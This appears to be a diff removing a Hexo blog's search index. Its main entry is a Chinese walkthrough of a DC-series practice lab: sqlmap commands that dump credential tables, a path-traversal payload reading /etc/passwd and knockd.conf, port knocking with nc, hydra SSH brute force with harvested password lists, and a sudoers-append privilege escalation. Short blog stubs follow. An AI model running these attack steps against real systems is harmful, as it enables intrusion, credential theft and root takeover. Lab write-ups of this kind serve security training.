-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA0ZGEyMjgzZDM2MGRhZThjNDQ4YzY4MjU1MTAwMGFfeFMwUmQ1M0VYMFpZbWswNXdoQUMxWjA0VEQyWWVmdXBfVG9rZW46WTRUNWJjUGt5b3p2R2t4Vzd6dmNTQ0N1bjdjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>得到数据库后进行爆表&#x2F;数据库：Staff</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -tables</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlNWE3Mzc4NDJhYTlkNzkwZTUxZWRkZGI2YjQwMmJfYlRETGVaTHFLYWlDdTdGa1lLcG5tdlhjcjZ3TDhDaTJfVG9rZW46RWk3Y2JaY2Vpb2xkTHV4SFJQMmM0bWxMbnBiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -columns</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFjZDAwNDUwODc3ZGM0ZTFjNWNkZmYxYzY1OTAzZmFfT2lBb0FhVmtwRktUYklPMWZYMjlxSlVjUFVPcWdib1BfVG9rZW46T204SmJ6OGJvb1JmQWx4dlFiU2N5WWNxbnhjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -C &#x27;Username,Password,UserID&#x27; -dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNDA1Yzc5MTRjMzA3NTk3NDBiNzRiNGQyZjY3NWJfYmU4NkVXWFJWYk9aQVNyMDIwSExpSWE2N09sdzBna3ZfVG9rZW46TlVlMGJZRkhnb0JhcEh4a2g0RWNiWDJxbmdkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>只有一位用户，还有密码，这密码一看就是md5，接下来找个在线网站解密<a href="https://www.somd5.com/">https://www.somd5.com/</a></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg2NjAyMGVjNzBiY2Q5NjVlODM1NDUwNDMzNjgyODBfZFVqQlBuTzFIdEo2amRvWXRjVmVZTGRZcllnMUZLanNfVG9rZW46TXg0V2JXWFdRb3dBN054OVVxTmNBd1ZKbk5mXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>密码：transorbital1</p>
-<h2 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h2><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDkyMTcxZWUyZTFkMjU2OGIzMDk4MmYxZTcxYjY3MDFfSW00cDBjVnNMaGZMb1N2Tnp4WjdhWGhYZFA4SVNEdWpfVG9rZW46SXc0aGJLaFNxb1RYREN4SnBsWmNEMUZEbnhmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p>
-<p>burpsuite抓包，构建payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?§§=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MmVlMzI4ZTdiNjI4NDJjYzRjNGIwNjViYjk3OGJfblVqNkFmUHJXVFVmcjJJdVJsa2FsT0R0VXA3UXhzSHZfVG9rZW46V1V2N2JuN1VDb1F1V2N4S3lYN2NGTEVibjdiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>然后再把我们的参数字典加载进来</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE3ODVhMzNmZjgzYjVkMzZmZjI5MWEyNTJjYjY5MzdfcUcxdlpKUEFoQlA4ZUxncFRLV3JIMHdqR0RseDEwSGZfVG9rZW46VTluTGJsVk5Cb1kwZ3Z4MTAwNWM5MjJVbkNkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4NTM3MTE0MTE3NDY3ZDg3YTUzMGE0M2QwYTg4ZjhfazZkQUxkNkhlM1JwUVJvS1doMHg2ZTJzZ1VkUlRoOFRfVG9rZW46TTkzMmJaSjJKb3JJZU54U3hJdGNZa2ZFbnpjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>参数名是file，存在任意文件读取漏洞</p>
-<h2 id="端口敲门服务"><a href="#端口敲门服务" class="headerlink" title="端口敲门服务"></a>端口敲门服务</h2><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p>
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/addrecord.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ4NjUwNzg2OTdhZTEwNWVlMDY5NDhhNWNhYmUxOGFfTGhEZ0ZSZWQwZ3c4SHhqckJGb2xIYkhHYkU3ZHl0S1hfVG9rZW46Sk50VGJueWtEb0Z0R1Z4QmV4NWNzRzJJbnNmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -z 192.168.217.137 7469 8475 9842</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3NjkzMGY0NzM4MGE4YWY1NDZmZjFiYWEzZGQzYTFfUWtmYkJvQW56ZTYxNlMxdVk1QXFSeUhUZGtmOGhpZGZfVG9rZW46WktlWmJJSWI3bzhQQ1N4TW5IdmNmSFdSbnVRXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>敲击完后发现端口打开了</p>
-<h2 id="shh爆破"><a href="#shh爆破" class="headerlink" title="shh爆破"></a>shh爆破</h2><p>无奈测试了一下admin登不上去，想起之前SQLmap跑出过一个users的数据库</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5MTNmOTY0ZWRiMGNkYTYyMWEzODI1MzAzYjJlMzZfdEpHTTl1NDJnSHg2N2pOa2FHa2s5STlNdHFYZDFQcjdfVG9rZW46VGlmcmJ1emszbzM2R0x4YzZXOWNpdmFPbkVoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>存放网站用户信息的，我们去瞧一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;users&#x27; -dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5N2ZmNTAwZjYxYTJkOGQ4MTNlMjI3MjAzOTE0YTNfSG5jTGxuaWhubGV2N2V5S3BnUWFWb3JQSUY1b0xwS0VfVG9rZW46QzY0b2JyaURxb3FMTGl4bkRKdGN4amdqbkxmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>用这些账号密码组成字典，爆破ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ``username.txt</span><br></pre></td></tr></table></figure>
-
-<p>marym</p>
-<p>julied</p>
-<p>fredf</p>
-<p>barneyr</p>
-<p>tomc</p>
-<p>jerrym</p>
-<p>wilmaf</p>
-<p>bettyr</p>
-<p>chandlerb</p>
-<p>joeyt</p>
-<p>rachelg</p>
-<p>rossg</p>
-<p>monicag</p>
-<p>phoebeb</p>
-<p>scoots</p>
-<p>janitor</p>
-<p>janitor2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ``password.txt</span><br></pre></td></tr></table></figure>
-
-<p>3kfs86sfd</p>
-<p>468sfdfsd2</p>
-<p>4sfd87sfd1</p>
-<p>RocksOff</p>
-<p>TC&amp;TheBoyz</p>
-<p>B8m#48sd</p>
-<p>Pebbles</p>
-<p>BamBam01</p>
-<p>UrAG0D!</p>
-<p>Passw0rd</p>
-<p>yN72#dsd</p>
-<p>ILoveRachel</p>
-<p>3248dsds7s</p>
-<p>smellycats</p>
-<p>YR3BVxxxw87</p>
-<p>Ilovepeepee</p>
-<p>Hawaii-Five-0</p>
-<p>接下来用九头蛇进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0NTBmZGExY2E4MGFjZGIwZjdiOTMyMjZmYjVmNDNfb2k5WXltRFlKUFBXSFM3T1YyV1I4ZHpTNGZOVUxWY2tfVG9rZW46UWo0N2JRa1Yxb2JUQXZ4anRBYWN0b2RNbjdmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆破出了三个用户</p>
-<p>chandlerb:UrAG0D!</p>
-<p>joeyt:Passw0rd</p>
-<p>janitor:Ilovepeepee</p>
-<p>尝试登入发现janitor用户有东西</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd .s*</span><br><span class="line">cat *</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExOGQxNTM5MGU3ODNiZjVkN2NmNWI3MDE0OGY4YWNfazRlSk5Od2kzOUVCS2w1ZjJDZmdYM1VNOGdrdW9PeUtfVG9rZW46TjR3VWJLN0Jpb1hXbG94ZlNUZWNzaEFSbmJWXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>有几个密码，复制到刚才的password文件继续爆破ssh</p>
-<p>vi password.txt</p>
-<p>BamBam01</p>
-<p>Passw0rd</p>
-<p>smellycats</p>
-<p>P0Lic#10-4</p>
-<p>B4-Tru3-001</p>
-<p>4uGU5T-NiGHts</p>
-<p>继续爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmMjMxYTQ2M2U0ZTM4MjNmMTFmNTg5MzY3N2FjNjlfcUF1akZyaEc3bEJGVlg0TThMQzRad3Jtem82UmJjM2JfVG9rZW46V1l0VGJLRHh3b3BxUll4YmhsUmNiWW9NbnNlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆破出了一个新用户</p>
-<p>fredf     B4-Tru3-001</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlYzY5MWVlZDdkMGZkZmZhZTk5YjY2MTNhNjE1ZGFfVUZybjhkMkpPNkNEMTAzb1A4V0V4YkV0QXpBcXBvMHpfVG9rZW46TUJQTGJrZzI5b2hGREV4Vlkwd2NCSTN4bm1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU3NTVlYjhhMTE2Y2E5ODQxNTFhMDFkYTUzNWZmODZfTEh4YVhoR0d4eTM5R3lvODNQbTlkcU9TNjlEbHljSVJfVG9rZW46RkpwbWJ0VjdRb2M5SFJ4cmk5YmNra3VsbnlmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>发现有个root权限文件</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE0NWQ1NzU2MDNjYjAzMTlmODIwMjExMjc1MDc1OGZfcXhnMnN4clQxOG56aFBrMGFqUHpFUmlXRld0ckJMMjBfVG9rZW46SUNYVWJFMDZ1b3hlUFZ4WlBCMGNSREo3bk1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>打开test文件发现是一堆乱码，应该是一个程序</p>
-<p>type name 可以查看文件类型，看是否是二进制还是文本文件</p>
-<p>结果：啥也没看出来</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY3Y2FkZjM5ZDEzNWU3ZDc3MmQ1N2U0ZTFjYWYwMDlfVk1mZXNLSWtGZ0t3M1JiWlF0V3JlWHQ3RlNMRHNpUTlfVG9rZW46VlN1QmJaN3FMb3VuTE14VXg5MWNBUnFtblZjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>在上两级目录发现test.py文件还有test.spec文件，所以后面目录下的test程序应该就是根据test.py文件写的，打开文件看一下test程序是干嘛的</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY3NmY0YzMxNDMzYmMyMzM0MzcwMTI2ODJjODJhZjBfMnlQaTY4S010VmlKSUhmamdCSXNhQ2FPcVZhM1h0UGlfVG9rZW46S1hHU2I4VXFlb1Bza3l4V09HRmNGbmcwblA4XzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面</p>
-<p>利用&#x2F;etc&#x2F;sudoers     <a href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法-CSDN博客</a></p>
-<p>将fredf  ALL&#x3D;(ALL:ALL) ALL写成一个文件a.ttx   将这个文件追加到&#x2F;etc&#x2F;sudoers</p>
-<p>先将目录切换到有权限的&#x2F;home&#x2F;fredf</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/fredf</span><br></pre></td></tr></table></figure>
-
-<p>然后进行文件的创建的编辑</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi a.ttx`    有人说在这里vi是个微型的，简单来说有坑，所以也可以用`nano a.ttx</span><br></pre></td></tr></table></figure>
-
-<p>写完就可进行&#x2F;home&#x2F;fredf的写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test a.ttx /etc/sudoers</span><br></pre></td></tr></table></figure>
-
-<p>不显示就说明成功了</p>
-<p>之后进行用户切换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su - </span><br></pre></td></tr></table></figure>
-
-<p>sudo 就是尝试实行root权限  su就是提权  - 切换到环境变量里</p>
-<p>然后输入用户fredf的密码就可以了     密码：B4-Tru3-001</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NiOTg5OGY4MGQxZmRiNzQ2NjFmOGYyYWE4NDY0MmNfVjExVnd3REkzNjRMS0RhYU41RXdTRzBXM0l5cG5sOWdfVG9rZW46Vk53ZWJzVDhkbzh5OTR4WHN6emNRV001bjZlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>之后就是寻找flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat theflag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA3YTlhZjdiZmYwOTBmNzg5MTUzMjhlZTg2YzNiYWZfdENoZGVkcVMydWs2OVZjQTVXZ2o0S2trT2hwNWxKQjBfVG9rZW46SEF3VWJCREgyb0hCUTJ4bEp2bWNsVElLbmxiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-]]></content>
-      <categories>
-        <category>靶场，DC系列</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>好杂</title>
-    <url>/2024/03/31/ni-hao/</url>
-    <content><![CDATA[<h1 id="很杂"><a href="#很杂" class="headerlink" title="很杂"></a>很杂</h1><p>很杂</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY5YzU0ODVkZmQyMWQ1OTllZDU4YzUzODQ3Y2I0ZjJfN1RENVNyZkdQNTBNOHpyak9YR0Y2aDUxeWdxNnZ5NU5fVG9rZW46UFl3QWJmU1B5b1lYbFZ4VnV1cmNTWUxqblFmXzE3MTE4Njk5ODQ6MTcxMTg3MzU4NF9WNA" alt="img"></p>
-<h1 id="渗漏测试流程"><a href="#渗漏测试流程" class="headerlink" title="渗漏测试流程"></a>渗漏测试流程</h1><ol>
-<li>明确目标</li>
-<li>信息收集</li>
-</ol>
-<p> 域名，子域名，端口，网络架构，网站目录结构。。。。。。。</p>
-<ol>
-<li>漏洞分析&#x2F;漏洞扫描&#x2F;寻找漏洞</li>
-<li>漏洞利用</li>
-</ol>
-<p>Http  80 </p>
-<p>Https  443 </p>
-<hr>
-<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240331152749707.png" alt="image-20240331152749707"></p>
-<hr>
-<p>域名</p>
-<p>IP</p>
-<p>端口</p>
-<p>cms指纹</p>
-<p>网络空间测绘</p>
-<p>目录扫描</p>
-<hr>
-<p>网络空间测绘：</p>
-<p>钟馗之眼&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
-<p>fofa&#x2F;<a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
-<p>quake.360.cn&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
-<p>鹰图&#x2F;<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
-<p><img src="https://img2020.cnblogs.com/blog/1950264/202007/1950264-20200731170503369-279339554.jpg" alt="Snipaste_2020-07-31_15-42-19"></p>
-]]></content>
-      <categories>
-        <category>Blog</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用Hexo搭建个人博客</title>
-    <url>/2024/03/30/My-Blog/</url>
-    <content><![CDATA[<hr>
-<h1 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h1><p>​	今日不同往时，生死看淡，不服就干，奥里给！！！！！！</p>
-]]></content>
-      <categories>
-        <category>Blog</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/03/30/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
 </search>
